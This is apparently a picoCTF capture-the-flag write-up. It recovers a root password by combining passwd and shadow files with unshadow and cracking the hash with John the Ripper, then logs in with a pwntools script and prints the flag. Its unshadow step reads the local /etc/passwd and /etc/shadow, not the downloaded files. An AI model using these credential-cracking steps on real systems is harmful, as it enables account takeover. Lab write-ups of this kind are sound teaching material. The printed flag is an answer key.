# Problem
Okay, so we found some important looking files on a linux computer. Maybe they can be used to get a password to the process. Connect with ```nc 2018shell1.picoctf.com 38860```. Files can be found here: [passwd](https://2018shell1.picoctf.com/static/29633d1bd5ba677d6af455cf61b18f57/passwd) [shadow](https://2018shell1.picoctf.com/static/29633d1bd5ba677d6af455cf61b18f57/shadow).

## Hints:
If at first you don't succeed, try, try again. And again. And again.

If you're not careful these kind of problems can really "rockyou".

## Solution:

First, we need to download the files:
```bash
wget https://2018shell1.picoctf.com/static/29633d1bd5ba677d6af455cf61b18f57/passwd
wget https://2018shell1.picoctf.com/static/29633d1bd5ba677d6af455cf61b18f57/shadow
```

Then, we unshadow (combine to a format john can use) the files:
```bash
unshadow /etc/passwd /etc/shadow > unshadowed
```

Finally, we use john to crack passwords:
```bash
john ./unshadowed
Created directory: /home/roee/.john
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
superman         (root)
1g 0:00:00:07 100% 2/3 0.1420g/s 171.5p/s 171.5c/s 171.5C/s purple..larry
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Add we need to do now is to login and obtain the flag.
```python
#!/usr/bin/env python

from pwn import *


r = remote('2018shell1.picoctf.com', 38860)

print r.recvuntil('Username: ')
r.sendline('root')
print r.recvuntil('Password: ')
r.sendline('superman')

print r.recvall()
```

Flag: picoCTF{J0hn_1$_R1pp3d_4e5aa29e}
